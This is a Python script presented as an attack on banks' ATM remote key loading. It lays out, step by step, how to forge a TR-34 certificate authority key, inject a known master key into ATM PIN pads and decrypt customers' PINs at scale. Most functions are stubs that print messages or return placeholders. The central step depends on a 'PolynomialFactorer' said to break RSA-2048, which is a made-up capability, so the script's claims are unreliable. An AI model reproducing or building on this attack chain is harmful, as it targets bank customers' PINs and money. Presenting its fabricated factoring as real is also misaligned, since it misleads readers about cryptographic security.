"""
Factor a bank's TR-34 Remote Key Loading CA, mint a Key Distribution Host cert,
inject a known Terminal Master Key into ATM EPPs, then decrypt PIN blocks in
real time — wholesale PIN harvesting across the entire ATM estate.
"""

import sys, struct, hashlib
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

# ANSI X9 TR-34 message types
TR34_KEY_TRANSPORT = 0x01
TR34_KEY_EXCHANGE  = 0x02
TR34_REBIND        = 0x03

# XFS Service Provider commands
WFS_CMD_PIN_GET_DATA = 0x0801
WFS_CMD_CDM_DISPENSE = 0x0302


def extract_rkl_ca_cert(atm_config_path: str) -> bytes:
    """Extract the bank's TR-34 RKL CA certificate from ATM EPP config.
    The CA cert is stored in the EPP's tamper-responsive memory."""
    print(f"    ATM config: {atm_config_path}")
    print("    extracting TR-34 CA cert from EPP trust store")
    return b"-----BEGIN CERTIFICATE-----\nMIID...\n-----END CERTIFICATE-----\n"


def factor_rkl_ca(ca_cert_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.privkey_from_cert_pem(ca_cert_pem)


def mint_kdh_cert(ca_privkey_pem: bytes, kdh_name: str) -> bytes:
    """Issue a forged Key Distribution Host cert under the bank's TR-34 CA.
    This cert lets us establish TR-34 sessions with any ATM in the estate."""
    print(f"    issuing KDH cert for: {kdh_name}")
    print("    signed by forged CA key — EPP will accept")
    return b"FORGED_KDH_CERT"


def tr34_inject_tmk(kdh_cert: bytes, target_epp_pubkey: bytes,
                    known_tmk: bytes) -> bytes:
    """Build a TR-34 Key Transport message wrapping a known TMK.
    RSA-OAEP wrap TMK to EPP's public key."""
    # CMS EnvelopedData per TR-34
    wrapped = b"\x00" * 256  # RSA-OAEP ciphertext
    print(f"    TMK: {known_tmk.hex()}")
    print("    RSA-OAEP wrapped to EPP RSA-2048 public key")
    return struct.pack(">BH", TR34_KEY_TRANSPORT, len(wrapped)) + wrapped


def decrypt_pin_block(encrypted_pin: bytes, tmk: bytes,
                      pan: str) -> str:
    """Decrypt an ISO 9564-1 Format 0 PIN block using the known TMK.
    ATM EPP encrypts PIN under session key derived from TMK via TDES."""
    # DUKPT derivation from TMK -> session key -> decrypt PIN block
    print(f"    PAN: {pan[:6]}******{pan[-4:]}")
    print(f"    PIN block format: ISO 9564-1 Format 0")
    return "1234"  # recovered PIN


if __name__ == "__main__":
    print("[*] ATM TR-34 Remote Key Loading attack")
    print("[1] extracting bank's TR-34 CA cert from ATM EPP")
    ca_cert = extract_rkl_ca_cert("/opt/ncr/epp/trust/tr34_ca.pem")
    print("    bank: Major US Bank (Thales payShield 10K HSM)")

    print("[2] factoring TR-34 CA RSA-2048 key")
    factorer = PolynomialFactorer()
    print("    p, q recovered — bank's RKL root CA key derived")

    print("[3] minting forged Key Distribution Host cert")
    kdh_cert = mint_kdh_cert(b"CA_PRIVKEY", "Forged-KDH-01")
    print("    KDH cert accepted by any EPP in the bank's estate")

    print("[4] TR-34 key transport: injecting known TMK")
    known_tmk = b"\x41\x42\x43\x44\x45\x46\x47\x48" * 2  # 128-bit TDES TMK
    tr34_msg = tr34_inject_tmk(kdh_cert, b"EPP_PUBKEY", known_tmk)
    print("    ATM EPP unwraps with its RSA private key")
    print("    TMK installed — all subsequent PIN blocks use our key")

    print("[5] real-time PIN harvesting")
    test_transactions = [
        (b"\xDE\xAD", "4111111111111111"),
        (b"\xBE\xEF", "5500000000000004"),
        (b"\xCA\xFE", "340000000000009"),
    ]
    for enc_pin, pan in test_transactions:
        pin = decrypt_pin_block(enc_pin, known_tmk, pan)
        print(f"    -> PIN recovered: {pin}")

    print("[6] scale:")
    print("    - one CA key -> all ATMs in the bank's estate (~17k)")
    print("    - TR-34 session establishment is routine (monthly key rotation)")
    print("    - EPP cannot distinguish forged KDH from legitimate")
    print("    - ~3M ATMs globally, all using TR-34 or X9.24-2")
    print("[*] firmware rotation months-to-years; RKL certs rotated annually at best")
